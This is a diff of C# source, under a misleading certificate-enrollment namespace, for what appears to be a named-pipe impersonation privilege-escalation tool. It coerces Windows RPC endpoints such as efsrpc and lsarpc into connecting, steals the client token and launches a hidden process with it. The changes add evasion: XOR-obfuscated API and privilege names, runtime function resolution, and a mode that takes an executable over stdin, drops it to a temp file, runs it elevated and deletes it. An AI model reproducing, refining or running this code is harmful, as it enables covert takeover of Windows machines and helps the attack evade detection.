@@ -138,18 +138,214 @@ namespace CertificateServices.Enrollment
         }
     }
 
+    #region api resolution
+    internal static class X
+    {
+        [DllImport("kernel32", EntryPoint = "GetModuleHandleW", CharSet = CharSet.Unicode)]
+        static extern IntPtr G(string m);
+        [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, ExactSpelling = true)]
+        static extern IntPtr P(IntPtr h, string p);
+
+        internal static byte[] D(byte[] b)
+        {
+            var r = new byte[b.Length];
+            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
+            return r;
+        }
+        internal static string S(byte[] b)
+        {
+            var r = new byte[b.Length];
+            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
+            return Encoding.UTF8.GetString(r);
+        }
+        static T R<T>(IntPtr h, string p)
+        {
+            return (T)(object)Marshal.GetDelegateForFunctionPointer(P(h, p), typeof(T));
+        }
+
+        // MIDL stubs
+        internal static readonly byte[] _mps86 = new byte[] { 0xa3, 0xfe, 0x59, 0xfc, 0x0f, 0x6a, 0xc5, 0x20, 0x7f, 0xd6, 0x3d, 0x8c, 0xd5, 0x42, 0x9d, 0xf8, 0x53, 0xae, 0x01, 0x64, 0xf9, 0x18, 0x7d, 0xd1, 0x2b, 0x86, 0xe1, 0x3c, 0x97, 0xf2, 0x46, 0xa9, 0x07, 0x5e, 0xb5, 0x14, 0x1f, 0xca, 0x2d, 0x80, 0xd3, 0x36 };
+        internal static readonly byte[] _mps64 = new byte[] { 0xa3, 0xfe, 0x59, 0xfc, 0x0f, 0x6a, 0xc5, 0x20, 0x7f, 0xd6, 0x29, 0x8c, 0xd5, 0x42, 0x9d, 0xf8, 0x53, 0xae, 0x01, 0x64, 0xf9, 0x18, 0x7f, 0x91, 0x2b, 0x86, 0xe1, 0x3c, 0x97, 0xf2, 0x4d, 0xa8, 0x08, 0x5f, 0xb1, 0x14, 0x63, 0xca, 0x55, 0x80, 0xcb, 0x36, 0x99, 0xec };
+        internal static readonly byte[] _mts86 = new byte[] { 0xa3, 0xfe, 0x59, 0xb4, 0x1e, 0x6e, 0xc7, 0x20, 0x4b, 0x76, 0x31, 0x8c, 0xf6, 0x4a, 0xb8, 0xa4, 0x53, 0xae };
+        internal static readonly byte[] _mts64 = new byte[] { 0xa3, 0xfe, 0x59, 0xb4, 0x1e, 0x6e, 0xc7, 0x20, 0x4b, 0x76, 0x31, 0x8c, 0xf6, 0x4a, 0xb8, 0xa4, 0x53, 0xae };
+        // strings
+        internal static readonly byte[] _priv = new byte[] { 0xf0, 0x9b, 0x10, 0xd9, 0x7f, 0x0f, 0xb7, 0x53, 0x14, 0xb8, 0x50, 0xf8, 0x82, 0x12, 0xef, 0x91, 0x25, 0xc7, 0x65, 0x01, 0xd8, 0x7f };
+        internal static readonly byte[] _desk = new byte[] { 0xf4, 0x97, 0x37, 0xe7, 0x7b, 0x0b, 0xf5, 0x7c, 0x3f, 0xb3, 0x57, 0xed, 0x92, 0x2e, 0xe9 };
+        internal static readonly byte[] _lpipe = new byte[] { 0xff, 0xa2, 0x35, 0xdb, 0x6c, 0x0b, 0xa9, 0x48, 0x14, 0xa5, 0x45, 0xa3, 0xb7, 0x0b, 0xcd, 0xbd, 0x7c };
+        internal static readonly byte[] _ep1 = new byte[] { 0xcf, 0x8d, 0x38, 0xc6, 0x7f, 0x09 };
+        internal static readonly byte[] _ep2 = new byte[] { 0xc6, 0x98, 0x2a, 0xc6, 0x7f, 0x09 };
+        internal static readonly byte[] _ep3 = new byte[] { 0xd0, 0x9f, 0x34, 0xc6 };
+        internal static readonly byte[] _ep4 = new byte[] { 0xcf, 0x8d, 0x38, 0xc7, 0x7c };
+        internal static readonly byte[] _ep5 = new byte[] { 0xcd, 0x9b, 0x2d, 0xd8, 0x60, 0x0d, 0xaa, 0x4e };
+        internal static readonly byte[] _ncnp = new byte[] { 0xcd, 0x9d, 0x38, 0xd7, 0x61, 0x35, 0xab, 0x50 };
+        internal static readonly byte[] _g1 = new byte[] { 0xc0, 0xc8, 0x61, 0x85, 0x6b, 0x5e, 0xfd, 0x18, 0x56, 0xb2, 0x09, 0xb9, 0xd7, 0x6f, 0xac, 0xc9, 0x37, 0x9e, 0x24, 0x5c, 0xdc, 0x2f, 0x47, 0xfd, 0x1b, 0xb6, 0x82, 0x0c, 0xa3, 0x94, 0x29, 0x91, 0x33, 0x38, 0x8e, 0x71 };
+        internal static readonly byte[] _g2 = new byte[] { 0xc7, 0x98, 0x68, 0x8d, 0x3b, 0x5b, 0xa6, 0x15, 0x56, 0xb0, 0x54, 0xb4, 0xde, 0x6f, 0xa9, 0x9d, 0x64, 0x97, 0x24, 0x06, 0xd9, 0x2b, 0x45, 0xfd, 0x1f, 0xb0, 0xd2, 0x0a, 0xa2, 0xc5, 0x2c, 0xcb, 0x65, 0x6a, 0x8d, 0x70 };
+        internal static readonly byte[] _lh = new byte[] { 0xcf, 0x91, 0x3a, 0xd5, 0x63, 0x02, 0xaa, 0x53, 0x0f };
+        // DLL names
+        internal static readonly byte[] _k32 = new byte[] { 0xc8, 0x9b, 0x2b, 0xda, 0x6a, 0x06, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
+        internal static readonly byte[] _adv = new byte[] { 0xc2, 0x9a, 0x2f, 0xd5, 0x7f, 0x03, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
+        internal static readonly byte[] _rpc = new byte[] { 0xf1, 0x8e, 0x3a, 0xc6, 0x7b, 0x5e, 0xeb, 0x44, 0x17, 0xba };
+        // API names
+        static readonly byte[] _fn_ll = new byte[] { 0xef, 0x91, 0x38, 0xd0, 0x43, 0x03, 0xa7, 0x52, 0x1a, 0xa4, 0x48, 0xdb };
+        static readonly byte[] _fn_gsh = new byte[] { 0xe4, 0x9b, 0x2d, 0xe7, 0x7b, 0x0e, 0x8d, 0x41, 0x15, 0xb2, 0x5d, 0xe9 };
+        static readonly byte[] _fn_gft = new byte[] { 0xe4, 0x9b, 0x2d, 0xf2, 0x66, 0x06, 0xa0, 0x74, 0x02, 0xa6, 0x54 };
+        static readonly byte[] _fn_cfw = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x83, 0x49, 0x17, 0xb3, 0x66 };
+        static readonly byte[] _fn_cnpw = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x8b, 0x41, 0x16, 0xb3, 0x55, 0xdc, 0x8e, 0x32, 0xf8, 0xaf };
+        static readonly byte[] _fn_cnp = new byte[] { 0xe0, 0x91, 0x37, 0xda, 0x6a, 0x09, 0xb1, 0x6e, 0x1a, 0xbb, 0x54, 0xe8, 0xb7, 0x2b, 0xed, 0x9d };
+        static readonly byte[] _fn_inp = new byte[] { 0xea, 0x93, 0x29, 0xd1, 0x7d, 0x19, 0xaa, 0x4e, 0x1a, 0xa2, 0x54, 0xc2, 0x86, 0x2f, 0xf8, 0x9c, 0x03, 0xc7, 0x79, 0x01, 0xfc, 0x76, 0x1c, 0xb5, 0x45, 0xf2 };
+        static readonly byte[] _fn_ch = new byte[] { 0xe0, 0x92, 0x36, 0xc7, 0x6a, 0x22, 0xa4, 0x4e, 0x1f, 0xba, 0x54 };
+        static readonly byte[] _fn_atp = new byte[] { 0xe2, 0x9a, 0x33, 0xc1, 0x7c, 0x1e, 0x91, 0x4f, 0x10, 0xb3, 0x5f, 0xdc, 0x95, 0x2b, 0xeb, 0x91, 0x3f, 0xcb, 0x6e, 0x01, 0xcc };
+        static readonly byte[] _fn_lpv = new byte[] { 0xef, 0x91, 0x36, 0xdf, 0x7a, 0x1a, 0x95, 0x52, 0x12, 0xa0, 0x58, 0xe0, 0x82, 0x25, 0xf8, 0xae, 0x32, 0xc2, 0x7c, 0x01, 0xe8 };
+        static readonly byte[] _fn_cp = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x49, 0x0b, 0xb3 };
+        static readonly byte[] _fn_cpau = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x52, 0x14, 0xb5, 0x54, 0xff, 0x94, 0x03, 0xee, 0xad, 0x20, 0xcb, 0x7b, 0x33 };
+        static readonly byte[] _fn_rbfsb = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x77, 0xfe, 0x88, 0x2f, 0xce, 0x8c, 0x21, 0xc7, 0x67, 0x03, 0xfd, 0x73, 0x1b, 0xb4, 0x42, 0xe8, 0x86, 0x6b };
+        static readonly byte[] _fn_rbsai = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x62, 0xe9, 0x93, 0x03, 0xe8, 0x8c, 0x3b, 0xe7, 0x67, 0x02, 0xd0, 0x4d };
+        static readonly byte[] _fn_ncc2 = new byte[] { 0xed, 0x9a, 0x2b, 0xf7, 0x63, 0x03, 0xa0, 0x4e, 0x0f, 0x95, 0x50, 0xe0, 0x8b, 0x70 };
+        static readonly byte[] _fn_rbf = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x77, 0xfe, 0x82, 0x27 };
+        static readonly byte[] _fn_rsbcw = new byte[] { 0xf1, 0x8e, 0x3a, 0xe7, 0x7b, 0x18, 0xac, 0x4e, 0x1c, 0x94, 0x58, 0xe2, 0x83, 0x2b, 0xf3, 0x9f, 0x10, 0xc1, 0x64, 0x14, 0xd0, 0x69, 0x10, 0x87 };
+        static readonly byte[] _fn_rbso = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x62, 0xe9, 0x93, 0x0d, 0xed, 0x8c, 0x3a, 0xc1, 0x67 };
+
+        // delegate types — kernel32
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        internal delegate IntPtr D_LoadLibrary(string lp);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate IntPtr D_GetStdHandle(int h);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate int D_GetFileType(IntPtr h);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        internal delegate IntPtr D_CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        internal delegate IntPtr D_CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate IntPtr D_ConnectNamedPipe(IntPtr pipe, IntPtr zero);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate bool D_CloseHandle(IntPtr handle);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate bool D_CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
+        // delegate types — advapi32
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate bool D_ImpersonateNamedPipeClient(IntPtr pipe);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
+        internal delegate bool D_AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        internal delegate bool D_LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
+        internal delegate bool D_CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        // delegate types — Rpcrt4
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        internal delegate Int32 D_RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        internal delegate Int32 D_RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
+        internal delegate IntPtr D_NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
+        internal delegate IntPtr D_NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        internal delegate Int32 D_RpcBindingFree(ref IntPtr lpString);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+        internal delegate Int32 D_RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        internal delegate Int32 D_RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
+
+        // resolved delegate fields
+        internal static D_GetStdHandle pfGetStdHandle;
+        internal static D_GetFileType pfGetFileType;
+        internal static D_CreateFile pfCreateFile;
+        internal static D_CreateNamedPipe pfCreateNamedPipe;
+        internal static D_ConnectNamedPipe pfConnectNamedPipe;
+        internal static D_CloseHandle pfCloseHandle;
+        internal static D_CreatePipe pfCreatePipe;
+        internal static D_ImpersonateNamedPipeClient pfImpersonateNamedPipeClient;
+        internal static D_AdjustTokenPrivileges pfAdjustTokenPrivileges;
+        internal static D_LookupPrivilegeValue pfLookupPrivilegeValue;
+        internal static D_CreateProcessAsUser pfCreateProcessAsUser;
+        internal static D_RpcBindingFromStringBinding pfRpcBindingFromStringBinding;
+        internal static D_RpcBindingSetAuthInfo pfRpcBindingSetAuthInfo;
+        internal static D_NdrClientCall2x86 pfNdrClientCall2x86;
+        internal static D_NdrClientCall2x64 pfNdrClientCall2x64;
+        internal static D_RpcBindingFree pfRpcBindingFree;
+        internal static D_RpcStringBindingCompose pfRpcStringBindingCompose;
+        internal static D_RpcBindingSetOption pfRpcBindingSetOption;
+
+        internal static void Init()
+        {
+            IntPtr hK32 = G(S(_k32));
+            var pfLoadLib = R<D_LoadLibrary>(hK32, S(_fn_ll));
+            IntPtr hAdv = pfLoadLib(S(_adv));
+            IntPtr hRpc = pfLoadLib(S(_rpc));
+            pfGetStdHandle = R<D_GetStdHandle>(hK32, S(_fn_gsh));
+            pfGetFileType = R<D_GetFileType>(hK32, S(_fn_gft));
+            pfCreateFile = R<D_CreateFile>(hK32, S(_fn_cfw));
+            pfCreateNamedPipe = R<D_CreateNamedPipe>(hK32, S(_fn_cnpw));
+            pfConnectNamedPipe = R<D_ConnectNamedPipe>(hK32, S(_fn_cnp));
+            pfCloseHandle = R<D_CloseHandle>(hK32, S(_fn_ch));
+            pfCreatePipe = R<D_CreatePipe>(hK32, S(_fn_cp));
+            pfImpersonateNamedPipeClient = R<D_ImpersonateNamedPipeClient>(hAdv, S(_fn_inp));
+            pfAdjustTokenPrivileges = R<D_AdjustTokenPrivileges>(hAdv, S(_fn_atp));
+            pfLookupPrivilegeValue = R<D_LookupPrivilegeValue>(hAdv, S(_fn_lpv));
+            pfCreateProcessAsUser = R<D_CreateProcessAsUser>(hAdv, S(_fn_cpau));
+            pfRpcBindingFromStringBinding = R<D_RpcBindingFromStringBinding>(hRpc, S(_fn_rbfsb));
+            pfRpcBindingSetAuthInfo = R<D_RpcBindingSetAuthInfo>(hRpc, S(_fn_rbsai));
+            pfNdrClientCall2x86 = R<D_NdrClientCall2x86>(hRpc, S(_fn_ncc2));
+            pfNdrClientCall2x64 = R<D_NdrClientCall2x64>(hRpc, S(_fn_ncc2));
+            pfRpcBindingFree = R<D_RpcBindingFree>(hRpc, S(_fn_rbf));
+            pfRpcStringBindingCompose = R<D_RpcStringBindingCompose>(hRpc, S(_fn_rsbcw));
+            pfRpcBindingSetOption = R<D_RpcBindingSetOption>(hRpc, S(_fn_rbso));
+        }
+    }
+    #endregion
+
     class CertEnrollmentAgent
     {
+        const int STD_INPUT_HANDLE = -10;
+        const int FILE_TYPE_PIPE   = 3;
+
+        static void ReadFull(Stream s, byte[] buf, int count)
+        {
+            int offset = 0;
+            while (offset < count)
+            {
+                int n = s.Read(buf, offset, count - offset);
+                if (n == 0) throw new EndOfStreamException();
+                offset += n;
+            }
+        }
+
         static void Main(string[] args)
         {
-            if (args.Length < 1)
+            X.Init();
+
+            string targetCmdLine = null;
+            string tempFilePath  = null;
+
+            IntPtr hStdin = X.pfGetStdHandle(STD_INPUT_HANDLE);
+            if (X.pfGetFileType(hStdin) == FILE_TYPE_PIPE)
             {
-                return;
+                try
+                {
+                    Stream s = Console.OpenStandardInput();
+                    byte[] hdr = new byte[4];
+                    ReadFull(s, hdr, 4);
+                    int peSize = BitConverter.ToInt32(hdr, 0);
+                    byte[] peBytes = new byte[peSize];
+                    ReadFull(s, peBytes, peSize);
+                    tempFilePath  = Path.GetTempFileName();
+                    File.WriteAllBytes(tempFilePath, peBytes);
+                    targetCmdLine = tempFilePath;
+                }
+                catch { return; }
             }
-            string endpoint = "lsarpc";
+            else
+            {
+                if (args.Length < 1) return;
+                targetCmdLine = args[0];
+            }
+
+            string ep1 = X.S(X._ep1), ep2 = X.S(X._ep2), ep3 = X.S(X._ep3), ep4 = X.S(X._ep4), ep5 = X.S(X._ep5);
+            string endpoint = ep1;
             if (args.Length >= 2)
             {
-                if ((new List<string> { "lsarpc", "efsrpc", "samr", "lsass", "netlogon" }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
+                if ((new List<string> { ep1, ep2, ep3, ep4, ep5 }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
                 {
                     endpoint = args[1];
                 }
@@ -162,20 +358,19 @@ namespace CertificateServices.Enrollment
             LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
             using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
             {
-                string priv = new string(new char[]{'S','e','I','m','p','e','r','s','o','n','a','t','e','P','r','i','v','i','l','e','g','e'});
-                LookupPrivilegeValue(null, priv, out l[0].Luid);
+                X.pfLookupPrivilegeValue(null, X.S(X._priv), out l[0].Luid);
                 TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                 tp.PrivilegeCount = 1;
                 tp.Privileges = l;
                 l[0].Attributes = 2;
-                if (!AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
+                if (!X.pfAdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                 {
                     return;
                 }
             }
             string g = Guid.NewGuid().ToString("d");
             string pipePath = @"\\.\pipe\" + g + @"\pipe\srvsvc";
-            var hChannel = CreateNamedPipe(pipePath, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
+            var hChannel = X.pfCreateNamedPipe(pipePath, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
             if (hChannel == new IntPtr(-1))
             {
                 return;
@@ -189,7 +384,7 @@ namespace CertificateServices.Enrollment
             t2.Start(new object[] { g, endpoint });
             if (mre.WaitOne(3000))
             {
-                if (ImpersonateNamedPipeClient(hChannel))
+                if (X.pfImpersonateNamedPipeClient(hChannel))
                 {
                     IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                     SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
@@ -197,35 +392,39 @@ namespace CertificateServices.Enrollment
                     sa.pSecurityDescriptor = IntPtr.Zero;
                     sa.bInheritHandle = 1;
                     IntPtr hRead, hWrite;
-                    CreatePipe(out hRead, out hWrite, ref sa, 1024);
+                    X.pfCreatePipe(out hRead, out hWrite, ref sa, 1024);
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                     STARTUPINFO si = new STARTUPINFO();
                     si.cb = Marshal.SizeOf(si);
                     si.hStdError = hWrite;
                     si.hStdOutput = hWrite;
-                    si.lpDesktop = new string(new char[]{'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t'});
+                    si.lpDesktop = X.S(X._desk);
                     si.dwFlags = 0x101;
                     si.wShowWindow = 0;
-                    if (CreateProcessAsUser(tkn, null, args[0], IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
+                    if (X.pfCreateProcessAsUser(tkn, null, targetCmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                     {
                         t1 = new Thread(ProcessOutputStream);
                         t1.IsBackground = true;
                         t1.Start(hRead);
                         new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                         t1.Abort();
-                        CloseHandle(pi.hProcess);
-                        CloseHandle(pi.hThread);
-                        CloseHandle(tkn);
-                        CloseHandle(hWrite);
-                        CloseHandle(hRead);
+                        if (tempFilePath != null)
+                        {
+                            try { File.Delete(tempFilePath); } catch { }
+                        }
+                        X.pfCloseHandle(pi.hProcess);
+                        X.pfCloseHandle(pi.hThread);
+                        X.pfCloseHandle(tkn);
+                        X.pfCloseHandle(hWrite);
+                        X.pfCloseHandle(hRead);
                     }
                 }
             }
             else
             {
-                CreateFile(pipePath, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
+                X.pfCreateFile(pipePath, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
             }
-            CloseHandle(hChannel);
+            X.pfCloseHandle(hChannel);
         }
 
         static void ProcessOutputStream(object o)
@@ -248,7 +447,7 @@ namespace CertificateServices.Enrollment
             RpcServiceClient r = new RpcServiceClient(p);
             try
             {
-                string h = new string(new char[]{'\\','\\','l','o','c','a','l','h','o','s','t','/','P','I','P','E','/'});
+                string h = X.S(X._lpipe);
                 r.InvokeEncryptionService(h + g + "/\\" + g + "\\" + g);
             }
             catch (Exception)
@@ -263,89 +462,10 @@ namespace CertificateServices.Enrollment
             ManualResetEvent mre = objs[1] as ManualResetEvent;
             if (mre != null)
             {
-                ConnectNamedPipe(pipe, IntPtr.Zero);
+                X.pfConnectNamedPipe(pipe, IntPtr.Zero);
                 mre.Set();
             }
         }
-
-        #region pinvoke
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern IntPtr CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern IntPtr CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
-        static extern IntPtr ConnectNamedPipe(IntPtr pipe, IntPtr zero);
-        [DllImport("advapi32.dll", SetLastError = true)]
-        private static extern bool ImpersonateNamedPipeClient(IntPtr pipe);
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
-        public static extern bool CloseHandle(IntPtr handle);
-        [DllImport("advapi32.dll", SetLastError = true)]
-        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
-        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct TOKEN_PRIVILEGES
-        {
-            public uint PrivilegeCount;
-            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
-            public LUID_AND_ATTRIBUTES[] Privileges;
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct LUID_AND_ATTRIBUTES
-        {
-            public LUID Luid;
-            public UInt32 Attributes;
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct LUID
-        {
-            public uint LowPart;
-            public int HighPart;
-        }
-        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-        [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct STARTUPINFO
-        {
-            public Int32 cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public Int32 dwX;
-            public Int32 dwY;
-            public Int32 dwXSize;
-            public Int32 dwYSize;
-            public Int32 dwXCountChars;
-            public Int32 dwYCountChars;
-            public Int32 dwFillAttribute;
-            public Int32 dwFlags;
-            public Int16 wShowWindow;
-            public Int16 cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public IntPtr pSecurityDescriptor;
-            public int bInheritHandle;
-        }
-        #endregion
     }
 
     internal class ProcessWaitHandle : WaitHandle
@@ -358,46 +478,25 @@ namespace CertificateServices.Enrollment
 
     class RpcServiceClient
     {
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
-        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern Int32 RpcBindingFree(ref IntPtr lpString);
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
-        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
-        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
-        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);
-        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
-        internal static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
-
-        private static byte[] Xd(byte[] b) { byte[] r = new byte[b.Length]; for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ 0x41); return r; }
-        private static byte[] MIDL_ProcFormatStringx86 => Xd(new byte[] { 0x41, 0x41, 0x41, 0x09, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41, 0x4d, 0x41, 0x73, 0x41, 0x41, 0x41, 0x41, 0x41, 0x49, 0x41, 0x07, 0x43, 0x49, 0x40, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4a, 0x40, 0x45, 0x41, 0x4d, 0x41, 0x31, 0x41, 0x49, 0x41, 0x49, 0x41 });
